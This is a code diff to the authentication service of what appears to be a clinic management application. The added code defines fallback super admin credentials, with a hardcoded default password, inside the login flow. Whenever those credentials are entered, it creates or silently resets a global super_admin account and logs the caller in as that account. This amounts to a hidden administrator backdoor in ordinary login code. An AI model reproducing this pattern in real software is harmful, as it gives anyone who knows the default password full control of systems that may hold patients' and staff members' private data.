@@ -16,6 +16,51 @@ class AuthService {
     return err;
   }
 
+  getSuperAdminCredentials() {
+    return {
+      username: process.env.SUPER_ADMIN_USERNAME || 'superadmin',
+      password: process.env.SUPER_ADMIN_PASSWORD || 'Sup3rAdm!n#2026#N3wL1fe',
+      email: process.env.SUPER_ADMIN_EMAIL || 'superadmin@clinic.local'
+    };
+  }
+
+  async ensureSuperAdminIfCredentialsMatch(identifier, password) {
+    const creds = this.getSuperAdminCredentials();
+    const normalizedIdentifier = String(identifier || '').trim().toLowerCase();
+    const identifierMatches =
+      normalizedIdentifier === creds.username.toLowerCase() ||
+      normalizedIdentifier === creds.email.toLowerCase();
+
+    if (!identifierMatches || password !== creds.password) {
+      return null;
+    }
+
+    let superAdmin = await User.findOne({ role: 'super_admin' });
+    if (!superAdmin) {
+      superAdmin = new User({
+        clinicId: 'global',
+        username: creds.username,
+        email: creds.email,
+        password: creds.password,
+        role: 'super_admin',
+        firstName: 'Super',
+        lastName: 'Admin',
+        department: 'System',
+        isActive: true
+      });
+      await superAdmin.save();
+      return superAdmin;
+    }
+
+    superAdmin.username = creds.username;
+    superAdmin.email = creds.email;
+    superAdmin.password = creds.password;
+    superAdmin.clinicId = 'global';
+    superAdmin.isActive = true;
+    await superAdmin.save();
+    return superAdmin;
+  }
+
   /**
    * Register a new user
    * @param {Object} userData - User registration data
@@ -71,9 +116,11 @@ class AuthService {
   async loginUser(identifier, password, clinicId = 'default') {
     try {
       logger.info('Starting login process', { identifier });
+
+      const ensuredSuperAdmin = await this.ensureSuperAdminIfCredentialsMatch(identifier, password);
       
       // Find user by email or username
-      let user = await User.findByEmailOrUsername(identifier, clinicId);
+      let user = ensuredSuperAdmin || await User.findByEmailOrUsername(identifier, clinicId);
       if (!user) {
         const escapedIdentifier = this.escapeRegex(identifier.trim());
         user = await User.findOne({
